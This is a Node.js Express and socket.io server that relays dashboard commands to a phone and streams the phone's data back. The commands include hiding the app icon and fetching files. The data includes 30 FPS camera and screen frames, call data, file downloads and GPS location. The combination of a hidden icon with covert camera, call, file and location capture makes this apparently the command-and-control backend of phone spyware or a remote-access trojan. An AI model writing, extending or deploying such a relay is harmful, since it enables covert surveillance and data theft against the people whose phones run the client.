const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);

// Increase the limit for large Base64 strings (essential for 30 FPS streams)
const io = new Server(server, {
    maxHttpBufferSize: 1e8, // 100 MB
    cors: {
        origin: "*",
    }
});

// Serve the dashboard files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

// Standard route for the dashboard
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

io.on('connection', (socket) => {
    console.log('New connection:', socket.id);

    // Identify if the connection is from the Device or the Web Dashboard
    socket.on('register', (type) => {
        socket.join(type); // Joins 'device' room or 'web' room
        console.log(`Socket registered as: ${type}`);
    });

    /** * COMMAND ROUTING: Web -> Device
     * Relays commands like 'stream:0:video', 'get-files', or 'hide-icon'
     */
    socket.on('phone-execute', (cmd) => {
        console.log('Command received from web:', cmd);
        io.to('device').emit('phone-execute', cmd); 
    });

    /**
     * DATA RELAY: Device -> Web
     * Relays the 30 FPS frame data for Camera and Screen streams
     */
    socket.on('data-stream', (base64Data) => {
        // High-frequency relay to all connected dashboard clients
        io.to('web').emit('data-stream', base64Data);
    });

    /**
     * FILE EXPLORER RELAY: Device -> Web
     * Relays the JSON file list for the Windows-style explorer
     */
    socket.on('file-data', (jsonFiles) => {
        io.to('web').emit('file-data', jsonFiles);
    });

    /**
     * DOWNLOAD RELAY: Device -> Web
     * Relays the actual file buffer as Base64 for the browser to download
     */
    socket.on('file-download-ready', (fileObj) => {
        io.to('web').emit('file-download-ready', fileObj);
    });
socket.on('call-data', (data) => {
    io.to('web').emit('call-data', data);
});
    /**
     * SYSTEM STATUS RELAY: Device -> Web
     * Relays Battery level and GPS coordinates
     */
    socket.on('battery-update', (val) => {
        io.to('web').emit('battery-update', val);
    });

    socket.on('location-update', (locData) => {
        io.to('web').emit('location-update', locData);
    });

    socket.on('disconnect', () => {
        console.log('User disconnected:', socket.id);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});

